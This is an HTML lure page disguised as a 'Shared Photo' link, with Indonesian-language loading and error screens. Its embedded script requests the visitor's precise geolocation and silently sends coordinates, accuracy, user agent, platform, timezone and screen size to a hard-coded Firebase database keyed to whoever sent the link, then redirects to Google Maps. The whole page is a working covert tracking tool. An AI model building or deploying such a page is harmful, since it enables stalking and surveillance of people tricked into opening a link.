<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>Shared Photo</title>

<meta property="og:title" content="Shared Photo" />
<meta property="og:description" content="A photo has been shared with you. View the photo and its location details." />
<meta property="og:image" content="https://infocuaca.online/preview.jpg" />
<meta property="og:image:width" content="1200" />
<meta property="og:image:height" content="630" />
<meta property="og:image:type" content="image/jpeg" />
<meta property="og:url" content="https://infocuaca.online/view.html" />
<meta property="og:type" content="website" />
<meta property="og:site_name" content="infocuaca.online" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:title" content="Shared Photo" />
<meta name="twitter:description" content="A photo has been shared with you. View the photo and its location details." />
<meta name="twitter:image" content="https://infocuaca.online/preview.jpg" />

<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{
  height:100%;
  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;
  background:#0d0d0d;
  color:#fff;
  overflow:hidden;
}

/* ══ LOADING SCREEN ══ */
.screen{
  position:fixed;inset:0;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
  gap:20px;
  padding:40px 32px;
  text-align:center;
  transition:opacity .3s;
}
.screen.hide{display:none!important}

/* spinner */
.ring{
  width:64px;height:64px;
  border:4px solid rgba(255,255,255,.12);
  border-top-color:#4CAF50;
  border-radius:50%;
  animation:spin .75s linear infinite;
}
@keyframes spin{to{transform:rotate(360deg)}}

.screen-title{font-size:17px;font-weight:600;color:#fff}
.screen-sub{font-size:13px;color:#888;line-height:1.6;margin-top:-8px}

/* icon circle */
.icon-circle{
  width:72px;height:72px;
  border-radius:50%;
  display:flex;align-items:center;justify-content:center;
  margin-bottom:4px;
}
.icon-circle.green{background:rgba(76,175,80,.18)}
.icon-circle.red{background:rgba(211,47,47,.18)}
.icon-circle.orange{background:rgba(245,124,0,.18)}
.icon-circle svg{width:36px;height:36px}

/* retry button */
.btn-retry{
  margin-top:8px;
  padding:13px 32px;
  background:#4CAF50;
  color:#fff;
  border:none;border-radius:50px;
  font-size:14px;font-weight:700;
  font-family:inherit;cursor:pointer;
  transition:background .15s,transform .1s;
}
.btn-retry:active{background:#388E3C;transform:scale(.97)}
</style>
</head>
<body>

<!-- LOADING / WAITING GPS -->
<div class="screen" id="screenLoading">
  <div class="ring"></div>
  <div class="screen-title">Mendapatkan lokasi…</div>
  <div class="screen-sub">Izinkan akses lokasi<br>pada popup yang muncul</div>
</div>

<!-- DENIED -->
<div class="screen hide" id="screenDenied">
  <div class="icon-circle red">
    <svg viewBox="0 0 24 24" fill="#D32F2F" xmlns="http://www.w3.org/2000/svg">
      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
    </svg>
  </div>
  <div class="screen-title">Akses Lokasi Ditolak</div>
  <div class="screen-sub">Izinkan akses lokasi di<br>pengaturan browser lalu coba lagi.</div>
  <button class="btn-retry" onclick="startGeo()">Coba Lagi</button>
</div>

<!-- ERROR LINK -->
<div class="screen hide" id="screenErr">
  <div class="icon-circle orange">
    <svg viewBox="0 0 24 24" fill="#F57C00" xmlns="http://www.w3.org/2000/svg">
      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
    </svg>
  </div>
  <div class="screen-title">Link Tidak Valid</div>
  <div class="screen-sub">Foto ini tidak tersedia<br>atau link sudah kadaluarsa.</div>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";

const FC = {
  apiKey:"AIzaSyBYjDmJh5OG_AkZesWObgGkSgr6yX0iBEI",
  authDomain:"roraxbali-65802.firebaseapp.com",
  databaseURL:"https://roraxbali-65802-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId:"roraxbali-65802",
  storageBucket:"roraxbali-65802.firebasestorage.app",
  messagingSenderId:750633313866,
  appId:"1:750636313866:web:3d2e552960e06db83968b3"
};
const app = initializeApp(FC);
const db  = getDatabase(app);

const params    = new URLSearchParams(location.search);
const fotoUrl   = params.get('foto') || '';
const ownerUser = params.get('u')    || '';

const screenLoading = document.getElementById('screenLoading');
const screenDenied  = document.getElementById('screenDenied');
const screenErr     = document.getElementById('screenErr');

function show(el) {
  [screenLoading, screenDenied, screenErr].forEach(s => s.classList.add('hide'));
  el.classList.remove('hide');
}

if (!ownerUser) {
  show(screenErr);
} else {
  startGeo();
}

window.startGeo = function() {
  if (!navigator.geolocation) { show(screenErr); return; }
  show(screenLoading);

  navigator.geolocation.getCurrentPosition(
    pos => {
      const lat = pos.coords.latitude;
      const lng = pos.coords.longitude;

      push(ref(db, 'lokasi/' + ownerUser), {
        target:    'images',
        waktu:     Date.now(),
        lat, lng,
        akurasi:   pos.coords.accuracy,
        foto:      fotoUrl,
        platform:  navigator.platform || 'Unknown',
        userAgent: navigator.userAgent,
        timezone:  Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen:    screen.width + 'x' + screen.height,
        via:       'view',
        source:    'view.html'
      }).catch(() => {});

      window.location.href = 'https://www.google.com/maps?q=' + lat + ',' + lng;
    },
    err => {
      show(screenDenied);
    },
    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
  );
};
</script>
</body>
</html>
